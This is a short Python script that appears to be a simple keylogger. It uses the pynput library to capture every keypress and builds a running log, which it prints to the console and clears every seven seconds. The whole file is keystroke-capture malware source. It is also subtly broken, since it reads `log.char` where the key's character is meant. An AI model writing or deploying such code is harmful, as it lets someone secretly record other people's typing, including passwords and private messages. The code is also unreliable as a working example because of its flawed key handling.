#!/usr/bin/env python

from pynput import keyboard
import threading

log = ""

def process_key_press(key):
    global log
    try:
        log += str(log.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        else:
            log += f' {str(key)} '

def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(7, report)
    timer.start()

keyboard_listener = keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()